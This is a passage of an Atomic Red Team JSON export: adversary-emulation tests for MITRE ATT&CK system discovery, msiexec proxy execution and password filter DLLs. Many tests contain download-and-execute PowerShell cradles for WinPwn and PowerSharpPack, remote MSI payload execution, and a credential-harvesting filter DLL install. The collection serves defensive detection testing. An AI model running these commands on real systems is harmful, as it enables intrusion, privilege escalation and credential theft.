"224b4daf-db44-404e-b6b2-f4d1f0126ef8", "description": "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n", "supported_platforms": ["windows"], "executor": {"command": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n", "name": "command_prompt"}}, {"name": "Griffon Recon", "auto_generated_guid": "69bd4abe-8759-49a6-8d21-0f15822d6370", "description": "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)", "supported_platforms": ["windows"], "input_arguments": {"vbscript": {"description": "Path to sample script", "type": "string", "default": "PathToAtomicsFolder\\T1082\\src\\griffon_recon.vbs"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Sample script file must exist on disk at specified location (#{vbscript})\n", "prereq_command": "if (Test-Path \"#{vbscript}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{vbscript}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs\" -OutFile \"#{vbscript}\"\n"}], "executor": {"command": "cscript \"#{vbscript}\"\n", "name": "powershell", "elevation_required": false}}, {"name": "Environment variables discovery on windows", "auto_generated_guid": "f400d1c0-1804-4ff8-b069-ef5ddd2adbf3", "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "set\n", "name": "command_prompt"}}, {"name": "Environment variables discovery on freebsd, macos and linux", "auto_generated_guid": "fcbdd43f-f4ad-42d5-98f3-0218097e2720", "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "env\n", "name": "sh"}}, {"name": "Show System Integrity Protection status (MacOS)", "auto_generated_guid": "327cc050-9e99-4c8e-99b5-1d15f2fb6b96", "description": "Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.\n", "supported_platforms": ["macos"], "executor": {"command": "csrutil status\n", "name": "sh"}}, {"name": "WinPwn - winPEAS", "auto_generated_guid": "eea1d918-825e-47dd-acc2-814d6c58c0e1", "description": "Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwinPEAS -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "WinPwn - itm4nprivesc", "auto_generated_guid": "3d256a2f-5e57-4003-8eb6-64d91b1da7ce", "description": "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nitm4nprivesc -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "WinPwn - Powersploits privesc checks", "auto_generated_guid": "345cb8e4-d2de-4011-a580-619cf5a9e2d7", "description": "Powersploits privesc checks using oldchecks function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\noldchecks -noninteractive -consoleoutput", "cleanup_command": "rm -force -recurse .\\DomainRecon -ErrorAction Ignore\nrm -force -recurse .\\Exploitation -ErrorAction Ignore\nrm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore\nrm -force -recurse .\\LocalRecon -ErrorAction Ignore\nrm -force -recurse .\\Vulnerabilities -ErrorAction Ignore", "name": "powershell"}}, {"name": "WinPwn - General privesc checks", "auto_generated_guid": "5b6f39a2-6ec7-4783-a5fd-2c54a55409ed", "description": "General privesc checks using the otherchecks function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "WinPwn - GeneralRecon", "auto_generated_guid": "7804659b-fdbf-4cf6-b06a-c03e758590e8", "description": "Collect general computer informations via GeneralRecon function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGeneralrecon -consoleoutput -noninteractive", "name": "powershell"}}, {"name": "WinPwn - Morerecon", "auto_generated_guid": "3278b2f6-f733-4875-9ef4-bfed34244f0a", "description": "Gathers local system information using the Morerecon function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMorerecon -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "WinPwn - RBCD-Check", "auto_generated_guid": "dec6a0d8-bcaf-4c22-9d48-2aee59fb692b", "description": "Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nRBCD-Check -consoleoutput -noninteractive", "name": "powershell"}}, {"name": "WinPwn - PowerSharpPack - Watson searching for missing windows patches", "auto_generated_guid": "07b18a66-6304-47d2-bad0-ef421eb2e107", "description": "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')\nInvoke-watson", "name": "powershell"}}, {"name": "WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors", "auto_generated_guid": "efb79454-1101-4224-a4d0-30c9c8b29ffc", "description": "PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.", "supported_platforms": ["windows"], "executor": {"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')\nInvoke-SharpUp -command \"audit\"", "name": "powershell"}}, {"name": "WinPwn - PowerSharpPack - Seatbelt", "auto_generated_guid": "5c16ceb4-ba3a-43d7-b848-a13c1f216d95", "description": "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.", "supported_platforms": ["windows"], "executor": {"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')\nInvoke-Seatbelt -Command \"-group=all\"; pause", "name": "powershell"}}, {"name": "Azure Security Scan with SkyArk", "auto_generated_guid": "26a18d3d-f8bc-486b-9a33-d6df5d78a594", "description": "Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. \nOnce the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. \nSee https://github.com/cyberark/SkyArk \n", "supported_platforms": ["azure-ad"], "input_arguments": {"username": {"description": "Azure AD username", "type": "string", "default": null}, "password": {"description": "Azure AD password", "type": "string", "default": "T1082Az"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The SkyArk AzureStealth module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n", "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AzureStealth.ps1\"){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AzureStealth.ps1\"\n"}, {"description": "The AzureAD module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name AzureAD -Force\n"}, {"description": "The Az module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name Az -Force\n"}], "executor": {"command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\AzureStealth.ps1\" -force      \n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzAccount -Credential $Credential\nConnect-AzureAD -Credential $Credential\nScan-AzureAdmins -UseCurrentCred\n", "cleanup_command": "$resultstime = Get-Date -Format \"yyyyMMdd\"\n$resultsfolder = (\"Results-\" + $resultstime)\nremove-item $env:temp\\$resultsfolder -recurse -force -erroraction silentlycontinue\n", "name": "powershell", "elevation_required": true}}, {"name": "Linux List Kernel Modules", "auto_generated_guid": "034fe21c-3186-49dd-8d5d-128b35f181c7", "description": "Enumerate kernel modules installed 3 different ways. Upon successful execution stdout will display kernel modules installed on host 2 times, followed by list of modules matching 'vmw' if present.\n", "supported_platforms": ["linux"], "executor": {"command": "lsmod\nkmod list\ngrep vmw /proc/modules\n", "name": "sh"}}, {"name": "FreeBSD List Kernel Modules", "auto_generated_guid": "4947897f-643a-4b75-b3f5-bed6885749f6", "description": "Enumerate kernel modules loaded. Upon successful execution stdout will display kernel modules loaded, followed by list of modules matching 'vmm' if present.\n", "supported_platforms": ["linux"], "executor": {"command": "kldstat\nkldstat | grep vmm\n", "name": "sh"}}, {"name": "System Information Discovery with WMIC", "auto_generated_guid": "8851b73a-3624-4bf7-8704-aa312411565c", "description": "Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.\nhttps://nwgat.ninja/getting-system-information-with-wmic-on-windows/\nElements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:\nhttps://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\nhttps://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n", "supported_platforms": ["windows"], "executor": {"command": "wmic cpu get name\nwmic MEMPHYSICAL get MaxCapacity\nwmic baseboard get product\nwmic baseboard get version\nwmic bios get SMBIOSBIOSVersion\nwmic path win32_VideoController get name\nwmic path win32_VideoController get DriverVersion\nwmic path win32_VideoController get VideoModeDescription\nwmic OS get Caption,OSArchitecture,Version\nwmic DISKDRIVE get Caption\nGet-WmiObject win32_bios\n", "name": "command_prompt"}}, {"name": "Driver Enumeration using DriverQuery", "auto_generated_guid": "bd85e3d1-4aeb-4a1d-850f-7be3cb8d60b9", "description": "Executes the driverquery command to list drivers installed on the system. Adversaries utilize the feature to enumerate the driver and it can be\nused for Exploitation. \ncommand /v - provide verbose output but not valid for signed drivers\n        /si - provide information about signed drivers \n", "supported_platforms": ["windows"], "executor": {"command": "driverquery /v\ndriverquery /si\n", "name": "command_prompt"}}, {"name": "System Information Discovery", "auto_generated_guid": "4060ee98-01ae-4c8e-8aad-af8300519cc7", "description": "The script gathernetworkinfo.vbs is employed to collect system information such as the operating system, DNS details, firewall configuration, etc. Outputs are stored in c:\\Windows\\System32\\config or c:\\Windows\\System32\\reg. https://www.verboon.info/2011/06/the-gathernetworkinfo-vbs-script/\n", "supported_platforms": ["windows"], "executor": {"command": "wscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs\n", "elevation_required": true, "name": "command_prompt"}}, {"name": "Check computer location", "auto_generated_guid": "96be6002-9200-47db-94cb-c3e27de1cb36", "description": "Looks up country code configured in the registry, likely geofence. Upon execution, country code info will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n", "supported_platforms": ["windows"], "executor": {"command": "reg query \"HKEY_CURRENT_USER\\Control Panel\\International\\Geo\"\n", "name": "command_prompt"}}, {"name": "BIOS Information Discovery through Registry", "auto_generated_guid": "f2f91612-d904-49d7-87c2-6c165d23bead", "description": "Looks up for BIOS information in the registry. BIOS information is often read in order to detect sandboxing environments.  Upon execution, BIOS information will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n- https://evasions.checkpoint.com/techniques/registry.html\n", "supported_platforms": ["windows"], "executor": {"command": "reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion\nreg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion\n", "name": "command_prompt"}}]}, "T1218.007": {"name": "Msiexec", "technique_id": "attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336", "external_id": "T1218.007", "data_components": ["Module Load", "Command Execution", "Network Connection Creation", "Process Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)", "atomic_tests": [{"name": "Msiexec.exe - Execute Local MSI file with embedded JScript", "auto_generated_guid": "a059b6c4-e7d6-4b2e-bcd7-9b2b33191a04", "description": "Executes an MSI containing embedded JScript code using msiexec.exe\n", "supported_platforms": ["windows"], "input_arguments": {"msi_payload": {"description": "MSI file to execute", "type": "path", "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi"}, "msi_exe": {"description": "MSIExec File Path", "type": "path", "default": "c:\\windows\\system32\\msiexec.exe"}, "action": {"description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n", "type": "string", "default": "i"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n", "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\" -OutFile \"#{msi_payload}\"\n"}], "executor": {"command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n", "name": "command_prompt"}}, {"name": "Msiexec.exe - Execute Local MSI file with embedded VBScript", "auto_generated_guid": "8d73c7b0-c2b1-4ac1-881a-4aa644f76064", "description": "Executes an MSI containing embedded VBScript code using msiexec.exe\n", "supported_platforms": ["windows"], "input_arguments": {"msi_payload": {"description": "MSI file to execute", "type": "path", "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi"}, "msi_exe": {"description": "MSIExec File Path", "type": "path", "default": "c:\\windows\\system32\\msiexec.exe"}, "action": {"description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n", "type": "string", "default": "i"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n", "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi\" -OutFile \"#{msi_payload}\"\n"}], "executor": {"command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n", "name": "command_prompt"}}, {"name": "Msiexec.exe - Execute Local MSI file with an embedded DLL", "auto_generated_guid": "628fa796-76c5-44c3-93aa-b9d8214fd568", "description": "Executes an MSI containing an embedded DLL using msiexec.exe\n", "supported_platforms": ["windows"], "input_arguments": {"msi_payload": {"description": "MSI file to execute", "type": "path", "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi"}, "msi_exe": {"description": "MSIExec File Path", "type": "path", "default": "c:\\windows\\system32\\msiexec.exe"}, "action": {"description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n", "type": "string", "default": "i"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n", "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi\" -OutFile \"#{msi_payload}\"\n"}], "executor": {"command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n", "name": "command_prompt"}}, {"name": "Msiexec.exe - Execute Local MSI file with an embedded EXE", "auto_generated_guid": "ed3fa08a-ca18-4009-973e-03d13014d0e8", "description": "Executes an MSI containing an embedded EXE using msiexec.exe\n", "supported_platforms": ["windows"], "input_arguments": {"msi_payload": {"description": "MSI file to execute", "type": "path", "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi"}, "msi_exe": {"description": "MSIExec File Path", "type": "path", "default": "c:\\windows\\system32\\msiexec.exe"}, "action": {"description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n", "type": "string", "default": "i"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n", "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi\" -OutFile \"#{msi_payload}\"\n"}], "executor": {"command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n", "name": "command_prompt"}}, {"name": "WMI Win32_Product Class - Execute Local MSI file with embedded JScript", "auto_generated_guid": "882082f0-27c6-4eec-a43c-9aa80bccdb30", "description": "Executes an MSI containing embedded JScript code using the WMI Win32_Product class\n", "supported_platforms": ["windows"], "input_arguments": {"msi_payload": {"description": "MSI file to execute", "type": "path", "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi"}, "action": {"description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n", "type": "string", "default": "Install"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n", "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\" -OutFile \"#{msi_payload}\"\n"}], "executor": {"command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n", "name": "powershell"}}, {"name": "WMI Win32_Product Class - Execute Local MSI file with embedded VBScript", "auto_generated_guid": "cf470d9a-58e7-43e5-b0d2-805dffc05576", "description": "Executes an MSI containing embedded VBScript code using the WMI Win32_Product class\n", "supported_platforms": ["windows"], "input_arguments": {"msi_payload": {"description": "MSI file to execute", "type": "path", "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi"}, "action": {"description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n", "type": "string", "default": "Install"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n", "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi\" -OutFile \"#{msi_payload}\"\n"}], "executor": {"command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n", "name": "powershell"}}, {"name": "WMI Win32_Product Class - Execute Local MSI file with an embedded DLL", "auto_generated_guid": "32eb3861-30da-4993-897a-42737152f5f8", "description": "Executes an MSI containing an embedded DLL using the WMI Win32_Product class\n", "supported_platforms": ["windows"], "input_arguments": {"msi_payload": {"description": "MSI file to execute", "type": "path", "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi"}, "action": {"description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n", "type": "string", "default": "Install"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n", "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi\" -OutFile \"#{msi_payload}\"\n"}], "executor": {"command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n", "name": "powershell"}}, {"name": "WMI Win32_Product Class - Execute Local MSI file with an embedded EXE", "auto_generated_guid": "55080eb0-49ae-4f55-a440-4167b7974f79", "description": "Executes an MSI containing an embedded EXE using the WMI Win32_Product class\n", "supported_platforms": ["windows"], "input_arguments": {"msi_payload": {"description": "MSI file to execute", "type": "path", "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi"}, "action": {"description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n", "type": "string", "default": "Install"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n", "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi\" -OutFile \"#{msi_payload}\"\n"}], "executor": {"command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n", "name": "powershell"}}, {"name": "Msiexec.exe - Execute the DllRegisterServer function of a DLL", "auto_generated_guid": "0106ffa5-fab6-4c7d-82e3-e6b8867d5e5d", "description": "Loads a DLL into msiexec.exe and calls its DllRegisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n", "supported_platforms": ["windows"], "input_arguments": {"dll_payload": {"description": "DLL to execute that has an implemented DllRegisterServer function", "type": "path", "default": "PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll"}, "msi_exe": {"description": "MSIExec File Path", "type": "path", "default": "c:\\windows\\system32\\msiexec.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The DLL must exist on disk at specified location (#{dll_payload})\n", "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile \"#{dll_payload}\"\n"}], "executor": {"command": "#{msi_exe} /y \"#{dll_payload}\"\n", "name": "command_prompt"}}, {"name": "Msiexec.exe - Execute the DllUnregisterServer function of a DLL", "auto_generated_guid": "ab09ec85-4955-4f9c-b8e0-6851baf4d47f", "description": "Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n", "supported_platforms": ["windows"], "input_arguments": {"dll_payload": {"description": "DLL to execute that has an implemented DllUnregisterServer function", "type": "path", "default": "PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll"}, "msi_exe": {"description": "MSIExec File Path", "type": "path", "default": "c:\\windows\\system32\\msiexec.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The DLL must exist on disk at specified location (#{dll_payload})\n", "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile \"#{dll_payload}\"\n"}], "executor": {"command": "#{msi_exe} /z \"#{dll_payload}\"\n", "name": "command_prompt"}}, {"name": "Msiexec.exe - Execute Remote MSI file", "auto_generated_guid": "44a4bedf-ffe3-452e-bee4-6925ab125662", "description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.\n", "supported_platforms": ["windows"], "input_arguments": {"msi_payload": {"description": "MSI file to execute", "type": "string", "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"}, "msi_exe": {"description": "MSIExec File Path", "type": "path", "default": "c:\\windows\\system32\\msiexec.exe"}}, "executor": {"command": "#{msi_exe} /q /i \"#{msi_payload}\"\n", "name": "command_prompt"}}]}, "T1556.002": {"name": "Password Filter DLL", "technique_id": "attack-pattern--3731fbcd-0e43-47ae-ae6c-d15e510f0d42", "external_id": "T1556.002", "data_components": ["Windows Registry Key Modification", "Module Load", "File Creation"], "kill_chain_phases": ["credential-access", "defense-evasion", "persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3"], "description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)", "atomic_tests": [{"name": "Install and Register Password Filter DLL", "auto_generated_guid": "a7961770-beb5-4134-9674-83d7e1fa865c", "description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n", "supported_platforms": ["windows"], "input_arguments": {"dll_path": {"description": "Path to DLL to be installed and registered", "type": "path", "default": "PathToAtomicsFolder\\T1556.002\\bin"}, "dll_name": {"description": "Name of the Password Filter", "type": "string", "default": "AtomicRedTeamPWFilter.dll"}}, 